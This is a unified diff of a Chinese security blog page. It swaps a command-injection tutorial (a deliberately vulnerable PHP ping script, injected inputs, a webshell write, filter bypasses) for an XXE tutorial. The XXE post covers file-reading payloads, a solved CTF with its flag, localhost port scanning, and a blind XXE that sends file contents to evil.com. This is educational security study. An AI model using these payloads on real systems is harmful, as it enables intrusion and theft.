@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>Command injection summary | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="Command injection summary | 九世的博客">
+  <title>XXE漏洞学习 | 九世的博客</title>
+  <meta name="keywords" content=" XXE漏洞 ">
+  <meta name="description" content="XXE漏洞学习 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1169,9 +1169,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-Command-injection-summary" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-XXE漏洞学习" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">Command injection summary</h1>
+        <h1 class="article-title">XXE漏洞学习</h1>
     
     <div class="article-meta">
         
@@ -1180,14 +1180,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color1">XXE漏洞</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2019-01-29 22:56</time>
+        创建时间:<time class="date" title="更新时间: 2019-11-27 23:39:35">2019-11-27 23:06</time>
         
     </div>
     <div class="article-meta">
@@ -1209,7 +1209,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00前言"><span class="toc-text">0x00前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01漏洞产生的原因"><span class="toc-text">0x01漏洞产生的原因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02XML简单的用法"><span class="toc-text">0x02XML简单的用法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x003实战XXE"><span class="toc-text">0x003实战XXE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04参考链接"><span class="toc-text">0x04参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1224,114 +1224,129 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天把系统重装了一遍，起因经过不想说什么= =。由于下午都在安环境和打补丁，也就只有晚上能学习一下。把命令注入学习总结了一遍<br><img src="http://img.mp.itc.cn/upload/20170204/e5391a3c2cf145b18b5c6b56b7930b20_th.jpeg" alt=""></p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p><b>漏洞产生的原因</b><br>由于开发人员使用脚本语言提供的命令执行操作，过滤又不完善用户又可以只有控制输入的变量。导致了变量可控，造成命令注入。</p>
-<p><b>漏洞测试</b><br>测试环境为：win7+php5.6,使用phpstudy搭建<br>存在漏洞的脚本</p>
-<pre><code>&lt;html&gt;
-&lt;head&gt;
-    &lt;title&gt;命令注入测试&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;p&gt;输入IP&lt;/p&gt;
-&lt;form method=&quot;GET&quot; action=&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;];?&gt;&quot;&gt;
-    IP:&lt;input name=&quot;host&quot; type=&quot;text&quot; required&gt;&lt;br&gt;
-    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;
-    &lt;p id=&quot;demo&quot;&gt;我是结果&lt;/p&gt;
-&lt;/form&gt;
-&lt;/body&gt;
-&lt;/html&gt;
+        <h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>早上看到某篇公众号的文章发了一篇XXE漏洞挖到个星巴克，拿到了一手奖金。决定晚上瞧一下这个洞<br><img src="https://s2.ax1x.com/2019/11/27/QCIzef.png" alt="QCIzef.png"></p>
+<h1 id="0x01漏洞产生的原因"><a href="#0x01漏洞产生的原因" class="headerlink" title="0x01漏洞产生的原因"></a>0x01漏洞产生的原因</h1><p>XXE又叫XML外部实体注入（XML External Entity Injection）</p>
+<blockquote>
+<p>简单来说，XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。<br>例如，如果你当前使用的程序为PHP，则可以将libxml_disable_entity_loader设置为TRUE来禁用外部实体，从而起到防御的目的。</p>
+</blockquote>
+<blockquote>
+<p>XML基础<br>在介绍xxe漏洞前，先学习温顾一下XML的基础知识。XML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具</p>
+</blockquote>
+<h1 id="0x02XML简单的用法"><a href="#0x02XML简单的用法" class="headerlink" title="0x02XML简单的用法"></a>0x02XML简单的用法</h1><pre><code>
+&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;
+外部实体:
 
-&lt;?php
-header(&quot;Content-type: text/html;charset=utf-8&quot;);
-if(isset($_GET[&#39;host&#39;])){
-    $ud=$_GET[&#39;host&#39;];
-    $zx=system(&quot;ping &quot;.$ud);
-    echo $zx;
-    echo &quot;&lt;script&gt;document.getElementById(&#39;demo&#39;).innerText=$zx&lt;/script&gt;&quot;;
-}
-?&gt;
+&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;
+参数实体：
+
+&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;
+或者
+&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;
+实例演示：除参数实体外实体+内部实体
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE a [
+    &lt;!ENTITY name &quot;nMask&quot;&gt;]&gt;
+&lt;foo&gt;
+        &lt;value&gt;&amp;name;&lt;/value&gt; 
+&lt;/foo&gt;
+实例演示：参数实体+外部实体
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE a [
+    &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;
+    %name;
+]&gt;
+注意：%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。
+
+由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。
+
+外部实体
+外部实体即在DTD中使用
+
+&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;
+语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？
+主要的有file、http、https、ftp等等，当然不同的程序支持的不一样：
+
+实例演示：
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE a [ //定义一个外部名称
+    &lt;!ENTITY content SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt; // SYSTEM &quot;file:///xxxx&quot;用于读取文件
+&lt;foo&gt; //定义标签 标签名可以随便输入，也可以和外名称对应
+        &lt;value&gt;&amp;content;&lt;/value&gt; 
+&lt;/foo&gt;
+
+得带Content-Type: application/xml头，如果请求头类似于：Content-Type: application/json，那么可以改为Content-Type: application/xml试试有没有xml漏洞
+</code></pre><h1 id="0x003实战XXE"><a href="#0x003实战XXE" class="headerlink" title="0x003实战XXE"></a>0x003实战XXE</h1><p>这里找来一道CTF的题，BWAPP搭建出来的XXE好像有问题。和文章用一样的操作得出来的结果不符合<br><img src="https://s2.ax1x.com/2019/11/27/QCoD1A.png" alt="QCoD1A.png"></p>
+<p>题目地址：web.jarvisoj.com:9882<br><img src="https://s2.ax1x.com/2019/11/27/QCoWtg.png" alt="QCoWtg.png"></p>
+<p>抓包一手得到发现是如下请求的<br><img src="https://s2.ax1x.com/2019/11/27/QCooXq.png" alt="QCooXq.png"></p>
+<p>将<code>Content-Type</code>改为<code>Content-Type: application/xml</code>,发送以下内容探测是否存在XXE</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE sb [
+ &lt;!ENTITY xxe &quot;XXE Test&quot;&gt; //XXE Test是输出的内容 xxe可以为理解为一个变量
+ ]&gt;
+&lt;em&gt; //乱取个名就好
+  &amp;xxe; //理解为引用变量地址输出
+&lt;/em&gt; 
+</code></pre><p><img src="https://s2.ax1x.com/2019/11/27/QCTKDP.png" alt="QCTKDP.png"></p>
+<p>读取文件测试<br><img src="https://s2.ax1x.com/2019/11/27/QC7EZV.png" alt="QC7EZV.png"></p>
+<p>读取flag文件<br><img src="https://s2.ax1x.com/2019/11/27/QC72WQ.png" alt="QC72WQ.png"></p>
+<p>由于这里是py的环境没有办法测试更多</p>
+<pre><code>HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 44
+Server: Werkzeug/0.9.4 Python/2.7.6
+Date: Wed, 27 Nov 2019 15:37:08 GMT
+
+&lt;em&gt;
+  CTF{XxE_15_n0T_S7range_Enough}
+
+&lt;/em&gt;
+</code></pre><p>这里就直接列出来</p>
+<pre><code>ML文档是用PHP进行解析的，那么还可以使用php://filter协议来进行读取。
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY content SYSTEM &quot;php://filter/resource=c:/windows/win.ini&quot;&gt;
+]&gt;
+&lt;root&gt;&lt;foo&gt;&amp;content;&lt;/foo&gt;&lt;/root&gt;
+
+端口扫描
+加载外部DTD时有两种加载方式，一种为私有private，第二种为公共public。
+
+私有类型DTD加载：
+
+&lt;!ENTITY private_dtd SYSTEM &quot;DTD_location&quot;&gt;
+
+公共类型DTD加载：
+
+&lt;!ENTITY public_dtd PUBLIC &quot;DTD_name&quot; &quot;DTD_location&quot;&gt;
+在公共类型DTD加载的时候，首先会使用DTD_name来检索，如果无法找到，则通过DTD_location来寻找此公共DTD。利用DTD_location，在一定的环境下可以用来做内网探测。
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE root [
+    &lt;!ENTITY portscan SYSTEM &quot;http://localhost:3389&quot;&gt;
+]&gt;
+&lt;root&gt;&lt;foo&gt;&amp;portscan;&lt;/foo&gt;&lt;/root&gt;
 
 
-</code></pre><p>上面这个例子可以看到无任何过滤，输入变量又可控，导致可以被用户任意执行命令<br><img src="https://s2.ax1x.com/2019/01/29/kQ4lSP.png" alt="kQ4lSP.png"><br>输入：</p>
-<pre><code>127.0.0.1&amp;&amp;dir
-</code></pre><p><img src="https://s2.ax1x.com/2019/01/29/kQ40S0.md.png" alt="kQ40S0.md.png"><br>查看权限：</p>
-<pre><code>127.0.0.1&amp;&amp;whoami
-</code></pre><p><img src="https://s2.ax1x.com/2019/01/29/kQ4TmD.png" alt="kQ4TmD.png"></p>
-<p>反弹shell</p>
-<pre><code>echo &quot;&lt;?php @assert($_GET[_]);?&gt;&quot; &gt;&gt; zz.php
-</code></pre><p><img src="https://s2.ax1x.com/2019/01/29/kQ57vV.png" alt="kQ57vV.png"></p>
-<p><img src="https://s2.ax1x.com/2019/01/29/kQ5zCR.png" alt="kQ5zCR.png"></p>
-<p><b>绕过过滤</b><br>一些程序员为了防止这种情况的发生，进行了一定的过滤</p>
-<pre><code>&lt;html&gt;
-&lt;head&gt;
-    &lt;title&gt;命令注入测试&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;p&gt;输入IP&lt;/p&gt;
-&lt;form method=&quot;GET&quot; action=&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;];?&gt;&quot;&gt;
-    IP:&lt;input name=&quot;host&quot; type=&quot;text&quot; required&gt;&lt;br&gt;
-    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;
-    &lt;p id=&quot;demo&quot;&gt;我是结果&lt;/p&gt;
-&lt;/form&gt;
-&lt;/body&gt;
-&lt;/html&gt;
+blind xxe漏洞:
+对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。
+利用DTD进行数据回显
+有时读取文件时没有回显，这时可以利用DTD参数实体的特性将文件内容拼接到url中，达到读取文件的效果。
 
-&lt;?php
-header(&quot;Content-type: text/html;charset=utf-8&quot;);
-if(isset($_GET[&#39;host&#39;])){
-    $ud=$_GET[&#39;host&#39;];
-    $j=check($ud);
-    echo &quot;payload：$j&quot;;
-    echo &quot;&lt;br&gt;&quot;;
-    $zx=system(&quot;ping &quot;.$j);
-    echo $zx;
-    echo &quot;&lt;script&gt;document.getElementById(&#39;demo&#39;).innerText=$zx&lt;/script&gt;&quot;;
-}
-function check($v){
-    $black_list=array(&#39;;&#39;=&gt;&#39;&#39;,&#39;&amp;&#39;=&gt;&#39;&#39;);
-    $th=str_replace(array_keys($black_list),$black_list,$v); /*读取黑名单数组里面的key，替换为黑名单里面的值也就是空*/
-    return $th;
-}
-?&gt;
-</code></pre><p>&amp;和；被过滤掉了，那么我们用|代替</p>
-<pre><code>127.0.0.1 | ipconfig
-</code></pre><p><img src="https://s2.ax1x.com/2019/01/29/kQLxcd.png" alt="kQLxcd.png"></p>
-<p>过滤更严谨一点</p>
-<pre><code>&lt;html&gt;
-&lt;head&gt;
-    &lt;title&gt;命令注入测试&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;p&gt;输入IP&lt;/p&gt;
-&lt;form method=&quot;GET&quot; action=&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;];?&gt;&quot;&gt;
-    IP:&lt;input name=&quot;host&quot; type=&quot;text&quot; required&gt;&lt;br&gt;
-    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;
-    &lt;p id=&quot;demo&quot;&gt;我是结果&lt;/p&gt;
-&lt;/form&gt;
-&lt;/body&gt;
-&lt;/html&gt;
+ &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+ &lt;!DOCTYPE root[    
+ &lt;!ENTITY % file SYSTEM &quot;php://fileter/convert.base64-encode/resource=c:/windows/win.ini&quot;&gt;     
+ &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.1.100:8000/evil.dtd&quot;&gt;    
+ %dtd;     
+ %send;]&gt;
+ &lt;root&gt;&lt;/root&gt;
+evil.dtd
 
-&lt;?php
-header(&quot;Content-type: text/html;charset=utf-8&quot;);
-if(isset($_GET[&#39;host&#39;])){
-    $ud=$_GET[&#39;host&#39;];
-    $j=check($ud);
-    echo &quot;payload：$j&quot;;
-    echo &quot;&lt;br&gt;&quot;;
-    $zx=system(&quot;ping &quot;.$j);
-    echo $zx;
-    echo &quot;&lt;script&gt;document.getElementById(&#39;demo&#39;).innerText=$zx&lt;/script&gt;&quot;;
-}
-function check($v){
-    $black_list=array(&#39;;&#39;=&gt;&#39;&#39;,&#39;&amp;&#39;=&gt;&#39;&#39;,&#39;||&#39;=&gt;&#39;&#39;,&#39;|&#39;=&gt;&#39;&#39;,&#39;)&#39;=&gt;&#39;&#39;,&#39;(&#39;=&gt;&#39;&#39;);
-    $th=str_replace(array_keys($black_list),$black_list,$v); /*读取黑名单数组里面的key，替换为黑名单里面的值也就是空*/
-    return $th;
-}
-?&gt;
-</code></pre><p>或许这样可以防御大部分攻击，但是并不能完全保证不会被FUZZ绕过，而且未来说不定也会有办法什么之类的。<br>防御方案有两个：</p>
-<pre><code>1.在获取用户输入后，用正则匹配出要进行命令执行的
-2.加入token机制，表单限制为只能输入数字
-</code></pre><p>转载请声明：转自422926799.github.io</p>
+ &lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://evil.com/?content=%file;&#39;&gt;&quot;&gt;
+ %payload;
+在evil.dtd中将%file实体的内容拼接到url后，然后利用burp等工具，查看url请求就能获得我们需要的内容
+</code></pre><h1 id="0x04参考链接"><a href="#0x04参考链接" class="headerlink" title="0x04参考链接"></a>0x04参考链接</h1><p><a href="https://www.cnblogs.com/vincebye/p/7199290.html" target="_blank" rel="noopener">https://www.cnblogs.com/vincebye/p/7199290.html</a><br><a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/177979.html</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1341,12 +1356,12 @@ function check($v){
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Command injection summary</p>
+    <p><span class="copy-title">文章标题:</span>XXE漏洞学习</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-01-29, 22:56:40</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/e2532565.html" title="Command injection summary">http://422926799.github.io/posts/e2532565.html</a>
+    <p><span class="copy-title">发布时间:</span>2019-11-27, 23:06:26</p>
+    <p><span class="copy-title">最后更新:</span>2019-11-27, 23:39:35</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/8867b076.html" title="XXE漏洞学习">http://422926799.github.io/posts/8867b076.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
